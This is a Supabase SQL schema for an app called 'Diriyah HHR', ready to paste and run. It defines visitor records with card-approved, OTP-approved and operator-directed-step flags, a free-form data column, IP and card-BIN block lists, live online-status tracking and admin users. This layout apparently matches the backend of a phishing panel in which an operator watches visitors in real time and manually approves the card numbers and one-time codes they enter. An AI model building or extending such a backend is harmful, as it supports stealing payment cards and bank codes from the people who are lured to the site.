-- =====================================================================
-- Diriyah HHR — Supabase schema (replaces Firebase Firestore + RTDB)
-- Paste this entire file into Supabase → SQL Editor → New Query → Run.
-- Safe to re-run: every CREATE/ALTER is idempotent.
-- =====================================================================

create extension if not exists pgcrypto;

-- ---------------------------------------------------------------------
-- 1. visitors  (replaces Firestore "pays" collection)
--    Structured columns are kept for things we filter/sort on; every
--    other Firestore field lives verbatim in the `data` jsonb column.
-- ---------------------------------------------------------------------
create table if not exists public.visitors (
  id              text primary key,
  blocked         boolean not null default false,
  card_approved   boolean not null default false,
  otp_approved    boolean not null default false,
  directed_step   integer not null default 0,
  ip              text,
  current_page    text,
  data            jsonb   not null default '{}'::jsonb,
  created_date    timestamptz not null default now(),
  updated_at      timestamptz not null default now()
);
create index if not exists visitors_updated_at_idx on public.visitors (updated_at desc);
create index if not exists visitors_blocked_idx on public.visitors (blocked);

-- ---------------------------------------------------------------------
-- 2. blocked_ips  (replaces Firestore settings/blockedIps document)
-- ---------------------------------------------------------------------
create table if not exists public.blocked_ips (
  ip        text primary key,
  added_at  timestamptz not null default now()
);

-- ---------------------------------------------------------------------
-- 3. blocked_bins  (replaces Firestore "blocked_bins" collection)
-- ---------------------------------------------------------------------
create table if not exists public.blocked_bins (
  bin         text primary key,
  bank_name   text,
  card_brand  text,
  country     text,
  blocked_at  timestamptz not null default now()
);

-- ---------------------------------------------------------------------
-- 4. online_status  (replaces RTDB /status/{visitorId})
-- ---------------------------------------------------------------------
create table if not exists public.online_status (
  visitor_id  text primary key,
  online      boolean not null default false,
  last_seen   bigint  not null default 0,
  updated_at  timestamptz not null default now()
);

-- ---------------------------------------------------------------------
-- 5. admins  (dashboard users; password verification done by Supabase Auth)
--    To grant a user admin access:
--      1. Create them in Supabase → Authentication → Users.
--      2. INSERT INTO public.admins (uid, email) VALUES ('<uid>', '<email>');
-- ---------------------------------------------------------------------
create table if not exists public.admins (
  uid         uuid primary key,
  email       text not null,
  created_at  timestamptz not null default now(),
  disabled    boolean not null default false
);

-- ---------------------------------------------------------------------
-- Realtime: turn on logical replication for the SSE bridge.
-- ---------------------------------------------------------------------
do $$
begin
  if not exists (select 1 from pg_publication where pubname = 'supabase_realtime') then
    create publication supabase_realtime;
  end if;
end $$;

alter publication supabase_realtime add table public.visitors;
alter publication supabase_realtime add table public.blocked_ips;
alter publication supabase_realtime add table public.blocked_bins;
alter publication supabase_realtime add table public.online_status;

alter table public.visitors      replica identity full;
alter table public.blocked_ips   replica identity full;
alter table public.blocked_bins  replica identity full;
alter table public.online_status replica identity full;

-- ---------------------------------------------------------------------
-- Row-Level Security: deny everything to anon/auth roles.
-- The server uses the service-role key, which bypasses RLS.
-- ---------------------------------------------------------------------
alter table public.visitors      enable row level security;
alter table public.blocked_ips   enable row level security;
alter table public.blocked_bins  enable row level security;
alter table public.online_status enable row level security;
alter table public.admins        enable row level security;
-- (intentionally: no policies = anon and auth roles cannot read or write.)
